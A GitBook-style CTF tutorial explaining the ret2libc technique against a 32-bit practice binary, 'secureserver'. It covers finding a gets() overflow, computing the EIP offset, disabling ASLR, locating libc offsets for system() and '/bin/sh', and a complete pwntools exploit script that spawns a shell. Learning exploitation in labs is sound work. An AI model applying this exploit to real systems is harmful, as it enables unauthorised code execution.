---
description: 08/23/2023
---

# ‚è™ ret2libc

## Introduction

This is primarily the attack you will use when you notice that the <mark style="color:yellow;">NX protection</mark> is <mark style="color:green;">ENABLED</mark> on the binary that you are attacking. This means that <mark style="color:yellow;">you do NOT have an executable stack to mess around with</mark>. This is because <mark style="color:yellow;">the stack memory is protected with the no execute (NX) bit enabled</mark>.

**Why does this matter to us?**&#x20;

Well, in a typical stack-based buffer overflow, an attacker will be able to write their shellcode into the vulnerable program's stack and be able to execute it on the stack.

But, <mark style="color:yellow;">if</mark> the NX bit is <mark style="color:yellow;">ENABLED</mark>, we will <mark style="color:red;">not</mark> be able to execute our shellcode from the vulnerable program's stack.

**How does ret2libc work?**

<mark style="color:yellow;">This attack allows us to bypass the NX bit protection and divert the program's execution by re-using part of executable code found in the</mark> <mark style="color:green;">`libc`</mark> <mark style="color:yellow;">library</mark>. Note that this library is already automatically linked dynamically at compile time and loaded into the program's virtual memory space.

Let's reference this great diagram from **Red Team Notes**:

{% embed url="https://www.ired.team/offensive-security/code-injection-process-injection/binary-exploitation/return-to-libc-ret2libc" %}

<figure><img src="../.gitbook/assets/image (98).png" alt=""><figcaption></figcaption></figure>

Breakdown of what's going on:

1. <mark style="color:yellow;">The EIP</mark> is being <mark style="color:yellow;">overwritten</mark> with the address of the `system()` function found in the `libc` library
2. <mark style="color:yellow;">Right after the address of</mark> <mark style="color:yellow;"></mark><mark style="color:yellow;">`system()`</mark>, there's an address of the function `exit()`, this is so that once `system()` returns, the vulnerable program will jump to `exit()` which lives in the `libc` library as well. This is so that the vulnerable program will exit gracefully and as expected.
3. <mark style="color:yellow;">Right after the address of</mark> <mark style="color:yellow;"></mark><mark style="color:yellow;">`exit()`</mark>, there's a pointer to a memory location that <mark style="color:yellow;">contains the string</mark> <mark style="color:yellow;"></mark><mark style="color:yellow;">`/bin/sh`</mark> <mark style="color:yellow;"></mark><mark style="color:yellow;">which is the argument that will be passed to</mark> <mark style="color:yellow;"></mark><mark style="color:yellow;">`system()`</mark> <mark style="color:yellow;"></mark><mark style="color:yellow;">to execute a</mark> <mark style="color:yellow;"></mark><mark style="color:yellow;">`/bin/sh`</mark> <mark style="color:yellow;"></mark><mark style="color:yellow;">shell for us,</mark> <mark style="color:green;">**granting us a shell**</mark>.&#x20;

We can see the NX bit is enabled on this 32-bit binary here:

<figure><img src="../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

Remember, this means anything that we inject on the stack traditionally, will NOT be executed.&#x20;

We will be referencing CryptoCat's tutorial on **ret2libc** for this explanation and guide:

{% embed url="https://www.youtube.com/watch?v=0CFWHjc4B-I" %}

## Our Target

This is a binary and challenge created by CryptoCat, download it here from GitHub to follow along with this tutorial:

{% embed url="https://github.com/Crypto-Cat/CTF/blob/main/pwn/binary_exploitation_101/06-return_to_libc/32-bit/secureserver" %}

### Set Proper Permissions

```
sudo chown root:root secureserver
sudo chmod 4655 secureserver -- This will set the "sticky bit"
sudo chown root:root flag.txt
sudo chmod 600 flag.txt
```

This will allow/deny us from being able to do certain things like you normally would (in a good way).

### Quick Crash Course on Linux Permissions

<figure><img src="../.gitbook/assets/image (110).png" alt=""><figcaption></figcaption></figure>

<mark style="color:yellow;">Going right to left, root is the group who owns the file and the other root is the user that owns the file</mark>.

You will have `rwx` bits that are possible here. Each section is separated by a `-`.&#x20;

`rwx` means <mark style="color:yellow;">Read</mark>, <mark style="color:yellow;">Write</mark>, and <mark style="color:yellow;">Execute</mark>.

This will <mark style="color:green;">allow</mark>/<mark style="color:red;">deny</mark> <mark style="color:yellow;">you to be able to perform those actions on that file</mark>.

The <mark style="color:yellow;">**first**</mark> section (right to left) is the "<mark style="color:yellow;">Others</mark>" permission.

The <mark style="color:yellow;">**second**</mark> section is the "<mark style="color:yellow;">Group</mark>" permission.

The <mark style="color:yellow;">**third**</mark> section is the "<mark style="color:yellow;">Owner's</mark>" permission.

<mark style="color:yellow;">STICKY BIT</mark>: This means that anyone will be able to execute this file, no matter the user.

* This can be seen with the <mark style="color:red;">RED</mark> marking rather than the yellow
* Also, you can tell if it is a sticky bit from the <mark style="color:yellow;">`S`</mark> in the permission bits

For these files in particular,&#x20;

## Enumeration

`checksec`:

<figure><img src="../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

* 32-bit binary
* <mark style="color:green;">NX ENABLED</mark>

`file`:

{% code overflow="wrap" %}
```
secureserver: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=ba7b32f02b9ce5948bcb57c33599de4ad17682de, for GNU/Linux 3.2.0, not stripped
```
{% endcode %}

* 32-bit&#x20;
* Dynamically linked, meaning that instead of including all the code for our functions in the program itself or a header file, we are linking to the `libc` library at compile time to do this for us
  * So, all of this code is stored on YOUR `libc` library
* This binary is not stripped, meaning that we still have all of our debugging symbols, making our life easier to reverse

## Ghidra

So, <mark style="color:yellow;">since we are</mark> **dynamically linking** <mark style="color:yellow;">to the</mark> <mark style="color:yellow;"></mark><mark style="color:yellow;">`libc`</mark> <mark style="color:yellow;"></mark><mark style="color:yellow;">library this means that when we call a function found in the</mark> <mark style="color:yellow;"></mark><mark style="color:yellow;">`libc`</mark> <mark style="color:yellow;"></mark><mark style="color:yellow;">library</mark>, our program will access the <mark style="color:yellow;">Global Offset Table</mark> (GOT) and go to that GOT section and look to see what the address of the called function in the libc library. This will be different on every machine since there are different versions of `libc`. This means that we can <mark style="color:yellow;">RETURN to functions FOUND IN</mark> <mark style="color:yellow;"></mark><mark style="color:yellow;">`libc`</mark>.

`libc` contains functions such as `system(`) and we can pass the argument `/bin/sh` and we can return to the `libc` library and start executing functions in there!!! Hopefully granting us a shell.&#x20;

You can actually see the GOT in Ghidra within the Program tree:

<figure><img src="../.gitbook/assets/image (99).png" alt=""><figcaption></figcaption></figure>

Let's look through our functions in our symbol tree to find a vulnerable function to target:

<figure><img src="../.gitbook/assets/image (100).png" alt=""><figcaption></figcaption></figure>

After some analysis, I have found a function containing the vulnerable and deprecated `gets()` function, this is now our target, <mark style="color:yellow;">`receive_feedback()`</mark>.

So let's check out the function and see if we can find a buffer size we can attack:

```c
void receive_feedback(void)

{
  char local_4c [68];
  
  puts("Please leave your comments for the server admin but DON\'T try to steal our flag.txt:\n");
  gets(local_4c);
  return;
}
```

So, we see a <mark style="color:yellow;">buffer size of 68</mark> from our decompilation code for `receive_feedback()`.

<mark style="color:yellow;">The next objective is to find the offset to the instruction pointer (EIP)</mark>.

Let's send a cyclic pattern of 100 characters to the buffer, we can utilize `gdb` for this:

{% code overflow="wrap" %}
```
cyclic 100
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
```
{% endcode %}

<mark style="color:yellow;">Copy this and be ready to send it to the program</mark>.

<figure><img src="../.gitbook/assets/image (101).png" alt=""><figcaption></figcaption></figure>

<mark style="color:yellow;">**You might be asking yourself**</mark>: Why is our EIP address: `0x61616174`?

Well, that is because that is the hex value of "`taaa`"!

We can confirm this by running `hex` and passing "`taaa`" as the argument:

```
hex taaa
74616161
```

Okay, cool, but why is it backwards? This is because this binary is representing data backwards due to it using little-endian format.

From this, we can see that we begin to overwrite the EIP with our pattern at "`taaa`", so we can then use `cyclic -l taaa` to find our offset to EIP:

<figure><img src="../.gitbook/assets/image (102).png" alt=""><figcaption></figcaption></figure>

**So what if I told you there's even an easier way to find the offset to the instruction pointer?**

<mark style="color:yellow;">In Ghidra, if we go to our target function and we find our EBP, we can convert the hex value to decimal with a calculator and find the offset too!!!</mark>

<figure><img src="../.gitbook/assets/image (103).png" alt=""><figcaption></figcaption></figure>

We see that `0x4c` is the hex value of our EBP.

Let's convert that to decimal:

<figure><img src="../.gitbook/assets/image (104).png" alt=""><figcaption></figcaption></figure>

<mark style="color:yellow;">We get 76, how crazy is that??</mark>

## Finding `libc` Base Address

So, we are going to overwrite the instruction pointer with a function within the `libc` library.

For this example, we will call `system()`, found in `libc`, and pass `/bin/sh` as an argument.

We can use `pwndbg` to search for `/bin/sh` in our library:

```
search -t "/bin/sh"
```

<figure><img src="../.gitbook/assets/image (105).png" alt=""><figcaption></figcaption></figure>

There is also another way that we can do this on a LOCAL system:

```
ldd <binary_name>
```

<figure><img src="../.gitbook/assets/image (106).png" alt=""><figcaption></figcaption></figure>

That address is where our `libc` library is located in memory.

### Address Space Layout Randomization (ASLR)

However, this address is constantly subject to change as long as <mark style="color:yellow;">Address Space Layout Randomization</mark> (<mark style="color:yellow;">ASLR</mark>) is <mark style="color:green;">ENABLED</mark>.&#x20;

<mark style="color:yellow;">This protection is in place automatically to prevent buffer overflows</mark>.

We can disable ASLR with the following command.&#x20;

NOTE: It will be enabled again after a reboot and requires sudo or root privileges:

```
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```

We can see if we try to `ldd` our binary, we will see that our `libc` library address will not change.

<figure><img src="../.gitbook/assets/image (107).png" alt=""><figcaption></figcaption></figure>

The address `0xf7d81000` is the <mark style="color:yellow;">base address</mark> of the `libc` library.

## Finding `system()` Offset

Great, so where is `system()` now?

We can use <mark style="color:yellow;">`readelf`</mark> <mark style="color:yellow;">to help us find this</mark> and pipe it to <mark style="color:yellow;">`grep`</mark> to better query our results:

```
readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system
2166: 00048150    63 FUNC    WEAK   DEFAULT   15 system@@GLIBC_2.0
```

So `48150` is the <mark style="color:yellow;">OFFSET</mark> for `system()` to our base address for `libc`.

However, <mark style="color:yellow;">if we were attacking a server remotely</mark>, there are techniques that we could use to "<mark style="color:yellow;">leak</mark>" out functions and use the same technique above to find the offset to the base address of `libc`.

You can then add the offset of `system()` to the base address and you will get the address of the targeted function.

<mark style="color:yellow;">In conclusion, you want to find the base of the</mark> <mark style="color:yellow;"></mark><mark style="color:yellow;">`libc`</mark> <mark style="color:yellow;"></mark><mark style="color:yellow;">library and then you will be able to find the offsets to other functions</mark>.

* Don't worry, we will go more in depth into this in the future

## Finding `/bin/sh` String Offset

So, if we use `strings` inside of the `libc` library, we will be able to find the offset to our base address for that string.

```
strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep "/bin/sh"
1bd0f5 /bin/sh
```

`1bd0f5` is the <mark style="color:yellow;">OFFSET</mark> for the `/bin/sh` string to the `libc`.

## Exploit Development

When it comes to building an exploit for `ret2libc`, this is an excellent template to use.

exploit.py:

```python
from pwn import *


# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify GDB script here (breakpoints etc)
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())


# Binary filename
exe = './secureserver'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'debug'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

io = start()

# Lib-c offsets, found manually (ASLR_OFF)
libc_base = 0xf7d81000
system = libc_base + 0x48150
binsh = libc_base + 0x1bd0f5

# How many bytes to the instruction pointer (EIP)?
padding = 76

payload = flat(
    asm('nop') * padding,  # Padding up to EIP
    system,  # Address of system function in libc
    0x0,  # Return pointer -- this can be garbage, we have to do this because we're attacking x86
    binsh  # Address of /bin/sh in libc
)

# Write payload to file
write('payload', payload)

# Exploit
io.sendlineafter(b':', payload)

# Get flag/shell
io.interactive()
```

<mark style="color:yellow;">Be sure to populate the variables with the proper addresses/offsets</mark>.

